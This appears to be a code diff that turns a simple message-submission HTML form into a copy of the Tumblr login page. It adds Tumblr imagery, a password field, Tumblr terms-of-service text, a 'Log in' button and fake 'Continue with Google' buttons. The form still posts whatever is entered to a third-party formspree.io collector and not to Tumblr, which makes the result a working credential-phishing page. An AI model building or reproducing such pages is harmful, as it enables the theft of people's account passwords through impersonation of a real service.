@@ -4,9 +4,10 @@
   <title>Submit</title>
   <style>
     body {
-      background-color: #f5f0e6;
+      background-image: url('https://64.media.tumblr.com/0cfbafe906efa7a5074d0c4a88c5c48d/d0c106bc825433ee-e8/s2048x3072/471aa4329e864ff7421348c5ecb916b708106f4b.jpg');
+      background-size: cover;
       font-family: Georgia, serif;
-      max-width: 600px;
+      max-width: 250px;
       margin: 80px auto;
       color: #3e3a34;
     }
@@ -16,37 +17,92 @@
     }
 
     textarea, input {
-      width: 100px;
+      width: 100%;
       padding: 10px;
-      margin-top: 10px;
-      border: 1px solid #aaa;
+      margin-top: 0px;
+      border: 1px solid #fffdf8;
       background: #fffdf8;
-      font-family: inherit;
+      font-family: Arial;
+      border-radius: 7px;
+      font-size: 11px;
+      outline: none;
+      line-height: 0.2;
     }
+    
+
 
     textarea {
-      border-radius: 10px;
-      height: 150px;
+
+      height: 12px;
       resize: none;
     }
 
     button {
-      margin-top: 15px;
+      margin-top: 5px;
       padding: 10px 20px;
-      background: #7a8f6a;
-      color: white;
+      background: #00b8ff;
+      width: 270px;
+      color: black;
       border: none;
       cursor: pointer;
-    }
+      border-radius: 2px;
 
-    button:hover {
-      background: #5f7353;
     }
+    
+        .bu2 {
+      margin-top: 5px;
+      padding: 10px 20px;
+      background: white;
+      width: 230px;
+      color: black;
+      border: none;
+      height: 13px;
+      border-radius: 2px;
+      font-size: 11px;
+      font-family: Arial;
+    }
+    
+.divider {
+  display: flex;
+  align-items: center;
+  text-align: center;
+  margin: 16px 0;
+  font-family: Arial;
+  font-size: 12px;
+  color: #ffffff;
+  line-height: 0.3;
+}
+
+.divider::before,
+.divider::after {
+  content: "";
+  flex: 1;
+  border-bottom: 1px solid #ffffff;
+
+}
+
+.divider::before {
+  margin-right: 10px;
+}
+
+.divider::after {
+  margin-left: 10px;
+}
+
+
+  
+
+
   </style>
 </head>
 <body>
 
-  <h1>Leave a Message</h1>
+  <h1> </h1>
+  <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> <br> 
+  
+  <img src="https://64.media.tumblr.com/d93153e27fd345df70aefe094dc1082a/6c646ad1915db7fd-2a/s250x400/a0a914872793e05e5b41e3603790e841a634c535.pnj"  style="margin-left: 20px; size: 90%;" > 
+  
+  <br> <br> 
 
   <form action="https://formspree.io/f/mgodwpdb" method="POST">
     
@@ -54,10 +110,25 @@
     <textarea name="message" placeholder="Write your message..."></textarea>
 
     <!-- Second box (hidden input) -->
-    <input type="password" name="secret" placeholder="Enter code...">
+    <input type="password" name="secret" placeholder="Password">
+    
+    <p style="color: #ffffff; font-size: 8px; font-family: Arial; text-align: center;  line-height: 1.5; "  >By clicking log in, or continuing with the other options below, you agree to Tumblrs <u>Terms of Service</u> and have read the <u>Privacy Policy</u> </p>  
 
-    <button type="submit">Submit</button>
-  </form>
+    <button type="submit">  Log in </button>
+      </form>
+    
+        <p style="color: #ffffff; font-size: 12px; font-family: Arial; text-align: center;"  > Forgot your password? </p>  
+        
+            <div class="divider">
+  <span>or</span>
+  
+</div>
+        
+     <div class="bu2 "> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWIl8zC8WAMHi5JVmKUb3YVvZd5gvoCdy-NQ&s"  style="width="10" height="10"" > &nbsp;&nbsp;  <b> Continue with Google </b> </div>   
+     
+          <div class="bu2 "> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWIl8zC8WAMHi5JVmKUb3YVvZd5gvoCdy-NQ&s"  style="width="10" height="10"" > &nbsp;&nbsp;  <b> Continue with Google </b> </div>  
+        
+
 
 </body>
 </html>
